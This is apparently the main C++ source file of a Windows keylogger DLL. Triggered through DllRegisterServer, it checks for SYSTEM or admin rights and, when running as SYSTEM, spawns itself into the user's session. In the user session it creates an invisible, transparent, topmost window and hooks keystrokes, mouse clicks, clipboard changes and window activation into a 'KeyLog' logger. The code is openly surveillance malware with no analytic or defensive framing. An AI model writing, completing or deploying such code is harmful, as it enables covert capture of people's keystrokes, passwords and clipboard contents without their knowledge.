#include "Tools.h"
#include "Define.h"
#include "Config.h"
#include "ClipboardManager.h"
#include "KeyboardManager.h"
#include "MouseManager.h"
#include "ListenerManager.h"
#include "LogManager.h"
#include "WindowManager.h"
#include"../../../File/FileManager/FileManager/PathHelper.hpp"
#include"../../../Process/WindowsProcessHelper/Fork/CreateOnceHelper.hpp"
#include"../../../Process/WSessionManager/SessionManager/SessionFork.h"

extern "C" __declspec(dllexport) VOID DllRegisterServer();
LRESULT CALLBACK WindowProc(HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	return (DefWindowProc(hwnd, message, wParam, lParam));
};
HWND InitWindow()
{
	WNDCLASSEX wndclass = { 0 };
	wndclass.cbSize = sizeof(WNDCLASSEX);
	wndclass.lpfnWndProc = WindowProc;
	wndclass.cbClsExtra = 0;
	wndclass.cbWndExtra = 0;
	wndclass.hInstance = GlobalData::hinstDLL;
	wndclass.lpszMenuName = NULL;
	wndclass.lpszClassName = L"WINCLASS";

	RegisterClassEx(&wndclass);

	return CreateWindowEx(WS_EX_TOOLWINDOW |
		WS_EX_NOACTIVATE |
		WS_EX_TRANSPARENT |
		WS_EX_LAYERED |
		WS_EX_TOPMOST,
		wndclass.lpszClassName,
		0,
		WS_POPUP,
		0, 0, 0, 0,
		NULL,
		NULL,
		GlobalData::hinstDLL,
		nullptr);
}
void mainLogic(void)
{
	ConfigManager::LoadConfig();
	bool bSystem = Tools::IsSystem();
	bool bAdmin = Tools::IsRunasAdmin();
	if (bAdmin)
	{
		KeyLog::Log("In Admin!!!\n");
	}
	else
	{
		KeyLog::Log("No Admin!!!\n");
	}
	if (bSystem)
	{
		KeyLog::Log("IsSystem");
		MessageBox(NULL, L"IsSystem", L"", MB_OK);
		SessionForkUtils::CreateDLL_Me(PathHelper::GetModuleFilePath(GlobalData::hinstDLL),SessionManager::GetSessionID());
	}
	else
	{
		KeyLog::Log("IsUser");
		CreateOnceHelp once(ConfigManager::LockFile());
		if (!once.Lock())
		{
			KeyLog::Log("Lock File Error");
		}
		else
		{
			KeyLog::Log("Lock File Sec");
		}
		GlobalData::hWindow = InitWindow();
		if (GlobalData::hWindow == NULL)
		{
			KeyLog::Log("Get HWND Error!" + to_string(GetLastError()));
			exit(-1);
		}
		KeyboardManager *pKey = new KeyboardManager();
		MouseManager *pMouse = new MouseManager();
		ClipboardManager *pClip = new ClipboardManager();
		ListenerManager::RegisterListener(WM_KEYDOWN, pKey);
		ListenerManager::RegisterListener(WM_RBUTTONDOWN, pMouse);
		ListenerManager::RegisterListener(WM_LBUTTONDOWN, pMouse);
		ListenerManager::RegisterListener(WM_CLIPBOARDUPDATE, pClip);
		ListenerManager::RegisterListener(WM_ACTIVATE, new WindowManager());
		ListenerManager::ListenerInit();
		ListenerManager::ListenerUpdate();
		ListenerManager::ListenerDestroy();
		once.UnLock();
	}
}
VOID DllRegisterServer()
{
	mainLogic();
}
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvREserved)
{
	switch (fdwReason)
	{
		//DLL被某进程加载
	case DLL_PROCESS_ATTACH:
		GlobalData::hinstDLL = hinstDLL;
		break;
		//DLL被某进程卸载
	case DLL_PROCESS_DETACH:
		break;
		//进程中有线程被创建
	case DLL_THREAD_ATTACH:
		break;
		//进程中有线程结束
	case DLL_THREAD_DETACH:
		break;
	}
	return TRUE;
}

void main()
{
	mainLogic();
}